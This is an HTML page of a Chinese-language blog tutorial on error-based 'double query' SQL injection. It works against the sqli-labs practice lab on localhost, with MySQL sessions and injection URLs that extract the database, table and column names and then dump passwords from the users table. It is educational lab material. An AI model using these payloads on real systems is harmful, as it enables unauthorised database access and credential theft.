@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- layout.ejs-->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="asdasdasasd">
+    <meta name="author" content="Asensio">
+    <meta name="keyword" content="hexo, hexo theme, A-RSnippet, responsive, bootstrap">
+    <link rel="canonical" href="http://yoursite.com/SQL注入-双查询注入/">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="A-RSnippet&lt;br&gt;&lt;a href=&#34;https://github.com/huyingjie/hexo-theme-A-RSnippet&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/Release-v0.1.0-red.svg&#34;&gt;&lt;/a&gt;" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
+
+    <title>
+        
+        SQL注入-Error Based Injections (Double Injection Based)｜Asensio&#39;s Blog
+        
+    </title>
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+    <link rel="stylesheet" href="/css/main.css">
+
+    
+      <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+      <link rel="stylesheet" href="/css/highlight.css">
+    
+
+    
+      <script id="dsq-count-scr" src="//hexo-a-rsnippet.disqus.com/count.js" async></script>
+    
+
+
+    
+      <meta name="google-site-verification" content="g5BseDGQ1hWwdbBPJLKNfbC6xNOaM3X4LnKEMAvx_tI" />
+    
+
+    
+
+    
+
+
+    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    
+<script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', 'UA-38355881-1', 'auto');
+    ga('send', 'pageview');
+</script>
+
+
+
+
+
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+
+    <!-- user customization -->
+    <link rel="stylesheet" href="/css/arsnippet.css">
+    <script src="/js/arsnippet.css.js"></script>
+</head>
+
+<style>
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<header>
+<!--
+  <nav class="navbar navbar-default header-navbar" id="nav-top" data-ispost = "true" data-istags="false" data-ishome = "false" >
+    <div class="container-fluid">
+      <div class="navbar-header page-scroll">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" aria-expanded="false"  data-target="#website_navbar">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <span class="navbar-brand animated pulse">
+          <a class="brand-logo" href="/">
+            A-RSnippet<br><a href="https://github.com/huyingjie/hexo-theme-A-RSnippet" target="_blank"><img src="https://img.shields.io/badge/Release-v0.1.0-red.svg"></a>
+          </a>
+        </span>
+      </div>
+
+      <div class="collapse navbar-collapse" id="website_navbar">
+          <ul class="nav navbar-nav navbar-right">
+              
+                <li>
+                  <a href="/">home</a>
+                </li>
+              
+                <li>
+                  <a href="/tutorial/">Tutorial</a>
+                </li>
+              
+                <li>
+                  <a href="/archives/">archives</a>
+                </li>
+              
+                <li>
+                  <a href="/categories/">categories</a>
+                </li>
+              
+                <li>
+                  <a href="/tags/">tags</a>
+                </li>
+              
+          </ul>
+      </div>
+  </nav>
+-->
+
+  
+    <style>
+       .intro-header {
+          background-image: url('/img/default_bg.png')          
+      }
+    </style>
+
+    <div class="intro-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                    <div class="site-heading">
+                        <a href="/" style="color:white"><h1>Asensio&#39;s Blog</h1></a>
+                        <div class="post-subtitle">asdasdasasd</div>
+                        
+                          <span class="meta">
+                               <span class="meta-item">Author: Asensio</span>
+                               <span class="meta-item">Date: Aug 24, 2017</span>
+                               
+                                 <span class="meta-item">Updated On: May 2, 2018</span>
+                               
+                          </span>
+                          <div class="tags text-center">
+                              Categories: 
+                              <a class="tag" href="/categories/#SQL注入"
+                                 title="SQL注入">SQL注入</a>
+                              
+                          </div>
+                          <div class="tags text-center">
+                              Tags: 
+                          </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+  
+</header>
+
+
+<!-- Main Content -->
+<!-- post.ejs -->
+<article>
+    <div class="container">
+      <div class="col-lg-8 col-lg-offset-1 col-sm-9">
+          
+            <div class="text-center"><div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5272bc2a7b3c1ddc" async = "async" ></script>
+</div>
+</div><hr>
+          
+          <!---->
+	 <div style="font-size:18px" class="subscribe">SQL注入-Error Based Injections (Double Injection Based)</div><p>
+          <p>双查询注入(Double Qurry)顾名思义形式上是两个嵌套的查询，即select …(select …)，里面的那个select被称为子查询，他的执行顺序也是先执行子查询，然后再执行外面的select，双查询注入主要涉及到了几个sql函数：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rand()随机函数，返回0~1之间的某个值</span><br><span class="line">floor(a)取整函数，返回小于等于a，且值最接近a的一个整数</span><br><span class="line">count()聚合函数也称作计数函数，返回查询对象的总数</span><br><span class="line">group by cluase分组语句，按照cluase对查询结果分组</span><br></pre></td></tr></table></figure></p>
+<p>双注入的原理总的来说就是，当一个聚合函数(如count())后面出现group by分组语句时，会将查询的一部分结果以报错的形式返回.<br><a id="more"></a><br>先在mysql中做一下实验：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; <span class="function">select <span class="title">rand</span><span class="params">()</span></span>;</span><br><span class="line">+--------------------+</span><br><span class="line">| rand()             |</span><br><span class="line">+--------------------+</span><br><span class="line">| <span class="number">0.8584465243466631</span> |</span><br><span class="line">+--------------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row in <span class="title">set</span> <span class="params">(<span class="number">0.00</span> sec)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">mysql&gt; select rand();</span><br><span class="line">+-------------------+</span><br><span class="line">| rand()            |</span><br><span class="line">+-------------------+</span><br><span class="line">| <span class="number">0.504866948821458</span> |</span><br><span class="line">+-------------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row in <span class="title">set</span> <span class="params">(<span class="number">0.00</span> sec)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">mysql&gt; select floor(rand());</span><br><span class="line">+---------------+</span><br><span class="line">| <span class="built_in">floor</span>(rand()) |</span><br><span class="line">+---------------+</span><br><span class="line">|             <span class="number">0</span> |</span><br><span class="line">+---------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row in <span class="title">set</span> <span class="params">(<span class="number">0.00</span> sec)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">mysql&gt; select floor(rand()*2);</span><br><span class="line">+-----------------+</span><br><span class="line">| <span class="built_in">floor</span>(rand()*<span class="number">2</span>) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               <span class="number">0</span> |</span><br><span class="line">+-----------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row in <span class="title">set</span> <span class="params">(<span class="number">0.00</span> sec)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">mysql&gt; select floor(rand()*2);</span><br><span class="line">+-----------------+</span><br><span class="line">| <span class="built_in">floor</span>(rand()*<span class="number">2</span>) |</span><br><span class="line">+-----------------+</span><br><span class="line">|               <span class="number">1</span> |</span><br><span class="line">+-----------------+</span><br><span class="line"><span class="number">1</span> <span class="function">row in <span class="title">set</span> <span class="params">(<span class="number">0.01</span> sec)</span></span></span><br></pre></td></tr></table></figure></p>
+<p>以sqli-labs(Less-5)为例：<br>输入<code>http://localhost/sqli-labs-master/Less-5/?id=1</code>页面显示<code>you are in</code><br>加入单引号<code>http://localhost/sqli-labs-master/Less-5/?id=1&#39;</code><br>根据语法报错<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code>我们能推断出后台的查询语句：<br><code>select uesrname and password from users where id=&#39;input&#39;</code>.<br>通过order by查询出字段数后，再用联合查询并不你能回显出任何信息，此时就需要运用Double Query．<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat((select database()),floor(rand()*2));</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| concat((select database()),<span class="built_in">floor</span>(rand()*<span class="number">2</span>)) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| security0                                   |</span><br><span class="line">+---------------------------------------------+</span><br></pre></td></tr></table></figure>
+<p>如果在语句后面上from,如：<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT CONCAT((SELECT database()), FLOOR(RAND()*2)) from users;</span><br></pre></td></tr></table></figure></p>
+<p>得到的结果：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select concat((select database()),floor(rand()*2)) from users;</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| concat((select database()),<span class="built_in">floor</span>(rand()*<span class="number">2</span>)) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| security1                                   |</span><br><span class="line">| security0                                   |</span><br><span class="line">| security1                                   |</span><br><span class="line">| security1                                   |</span><br><span class="line">| security1                                   |</span><br><span class="line">| security0                                   |</span><br><span class="line">| security1                                   |</span><br><span class="line">| security1                                   |</span><br><span class="line">| security1                                   |</span><br><span class="line">| security0                                   |</span><br><span class="line">| security1                                   |</span><br><span class="line">| security1                                   |</span><br><span class="line">| security1                                   |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line"><span class="number">13</span> <span class="function">rows in <span class="title">set</span> <span class="params">(<span class="number">0.00</span> sec)</span></span></span><br></pre></td></tr></table></figure></p>
+<p>users表中原有１３条用户信息，所以这里显示１３条记录．<br>再将concat和group by联合使用，给concat((select database()),floor(rand()*2))取别名为a<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select count(*),concat((select database()),floor(rand()*2)) as a from users group by a;</span><br><span class="line">+----------+-----------+</span><br><span class="line">| count(*) | a         |</span><br><span class="line">+----------+-----------+</span><br><span class="line">|        <span class="number">4</span> | security0 |</span><br><span class="line">|        <span class="number">9</span> | security1 |</span><br><span class="line">+----------+-----------+</span><br><span class="line"><span class="number">2</span> <span class="function">rows in <span class="title">set</span> <span class="params">(<span class="number">0.00</span> sec)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">mysql&gt; select count(*),concat((select database()),floor(rand()*2)) as a from users group by a;</span><br><span class="line">+----------+-----------+</span><br><span class="line">| count(*) | a         |</span><br><span class="line">+----------+-----------+</span><br><span class="line">|        <span class="number">5</span> | security0 |</span><br><span class="line">|        <span class="number">8</span> | security1 |</span><br><span class="line">+----------+-----------+</span><br><span class="line"><span class="number">2</span> <span class="function">rows in <span class="title">set</span> <span class="params">(<span class="number">0.00</span> sec)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">mysql&gt; select count(*),concat((select database()),floor(rand()*2)) as a from users group by a;</span><br><span class="line">ERROR 1062 (23000): Duplicate entry 'security0' for key '&lt;group_key&gt;'</span><br></pre></td></tr></table></figure></p>
+<p>再多次执行之后，语句执行报出了错误信息，其中serurity便表示希望得到的数据库名． 使用函数rand()和floor()<br>的目的在于能使用group by进行分组，如果执行语句<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select <span class="number">1</span>,count(*),(select database())as a from information_schema.schemata group by a;</span><br><span class="line">+---+----------+----------+</span><br><span class="line">| <span class="number">1</span> | count(*) | a        |</span><br><span class="line">+---+----------+----------+</span><br><span class="line">| <span class="number">1</span> |        <span class="number">6</span> | security |</span><br><span class="line">+---+----------+----------+</span><br></pre></td></tr></table></figure></p>
+<p>不会产生报错．<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//得到数据库名'security'</span></span><br><span class="line">http:<span class="comment">//localhost/sqli-labs-master/Less-6/?id=1" </span></span><br><span class="line">union select <span class="number">1</span>,count(*),concat((select database()),floor(rand()*<span class="number">2</span>))<span class="keyword">as</span> a </span><br><span class="line">from information_schema.schemata  group by a%<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//得到表名&apos;users&apos;</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1&quot; </span><br><span class="line">union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1),floor(rand()*2))as a </span><br><span class="line">from information_schema.schemata  group by a%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//得到列名&apos;password&apos;</span><br><span class="line"> http://localhost/sqli-labs-master/Less-6/?id=1&quot; </span><br><span class="line"> union select 1,count(*),concat((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 3,1 ),floor(rand()*2))as a </span><br><span class="line"> from information_schema.schemata group by a%23</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//脱库</span><br><span class="line">http://localhost/sqli-labs-master/Less-6/?id=1&quot; </span><br><span class="line">union select 1,count(*),concat((select password from users  limit 0,1),floor(rand()*2))as a </span><br><span class="line">from information_schema.schemata  group by a%23</span><br></pre></td></tr></table></figure>
+          
+            <a href="https://www.patreon.com/arsnippet" target="_blank"><img src="/img/patreon.png" alt="support my work at patron"> <a href="https://discord.gg/CB6CPzq" target="_blank"><img src="/img/discord.png" alt="Join the Discord"></a> <br><br><a href="https://arsnippet.freeflarum.com/" target="_blank"><img src="/img/forum.jpg" alt="support my work at patron"></a>
+          
+          <hr>
+          <ul class="pager">
+              
+              <li class="previous">
+                  <a href="/SQL注入-BLIND-Injections-Boolian-Based/" data-toggle="tooltip" data-placement="left"
+                     title="SQL注入-BLIND Injections(Boolian Based)">&larr; Previous Post</a>
+              </li>
+              
+              
+              <li class="next">
+                  <a href="/SQL注入基础知识/" data-toggle="tooltip" data-placement="top"
+                     title="SQL注入基础知识">Next Post&rarr;</a>
+              </li>
+              
+          </ul>
+        
+  <br>
+  
+  <!-- disqus start -->
+  <div class="comment">
+    <div id="disqus_thread"  class="disqus-thread"></div>
+      <script>
+      var disqus_shortname = 'hexo-a-rsnippet';
+      
+      var disqus_url = 'http://yoursite.com/SQL注入-双查询注入/';
+      
+      (function(){
+        var dsq = document.createElement('script');
+        dsq.type = 'text/javascript';
+        dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  </div>
+  <!-- disqus end -->
+  
+
+  
+  </div>
+
+
+        
+  <div class="hidden-xs col-sm-3 toc-col">
+    <div class="toc-wrap">
+        Table of Contents
+        
+          
+        
+    </div>
+  </div>
+
+
+      </div>
+  </div>
+</article>
+
+<!-- Footer -->
+<!-- footer.ejs -->
+<footer>
+    <div class="text-center">
+      <ul class="list-inline">
+          
+              <li>
+                  <a href="/atom.xml" target="_blank">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+          
+          
+
+          
+              <li>
+                  <a target="_blank" href="http://weibo.com/u/2911633817">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+          
+
+          
+              <li>
+                  <a target="_blank"  href="https://github.com/asensioatgithub">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+          
+
+          
+              <li>
+                  <a href="mailto:emilsinclair@163.com" target="_blank">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+      </ul>
+     <div class="text-muted copyright">
+            &copy;
+            
+            2017 - 2018
+            
+            
+              <i class="fa fa-heart"></i>
+            
+            Asensio
+        <br>
+          
+              Powered by <a target="_blank" href="https://hexo.io">Hexo</a>
+          
+          
+            |
+          
+          
+              Theme - <a href="https://github.com/huyingjie/hexo-theme-A-RSnippet" target="_blank">A-RSnippet</a> v0.1.0
+          
+          
+      </div>
+    </div>
+</footer>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+</body>
+
+</html>
